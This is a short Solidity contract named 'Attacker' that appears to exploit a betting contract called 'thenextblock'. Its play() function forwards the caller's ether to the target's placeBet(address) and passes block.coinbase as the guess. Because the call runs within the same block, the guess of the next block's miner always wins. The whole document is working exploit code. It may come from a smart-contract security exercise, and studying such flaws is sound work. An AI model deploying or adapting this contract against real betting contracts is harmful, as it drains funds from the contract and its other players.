pragma solidity ^0.4.19;

contract Attacker {
    
    function () public payable { }

    function play(address thenextblockContractAddress) public payable  {
        thenextblockContractAddress.call.value(msg.value)(bytes4(keccak256("placeBet(address)")), block.coinbase);
    }
}